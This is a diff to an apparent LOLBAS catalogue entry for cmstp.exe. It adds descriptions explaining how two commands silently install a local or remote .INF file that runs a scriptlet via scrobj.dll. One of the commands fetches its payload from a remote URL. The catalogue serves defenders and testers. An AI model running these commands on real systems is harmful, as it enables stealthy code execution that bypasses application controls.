@@ -6,9 +6,9 @@ Created: '2018-05-25'
 Categories: []
 Commands:
   - Command: cmstp.exe /ni /s c:\cmstp\CorpVPN.inf
-    Description: ''
+    Description: 'Silently installs a specially formatted local .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.'
   - Command: cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf
-    Description: ''
+    Description: 'Silently installs a specially formatted remote .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.'
 Full Path:
   - C:\Windows\system32\cmstp.exe
   - C:\Windows\sysWOW64\cmstp.exe
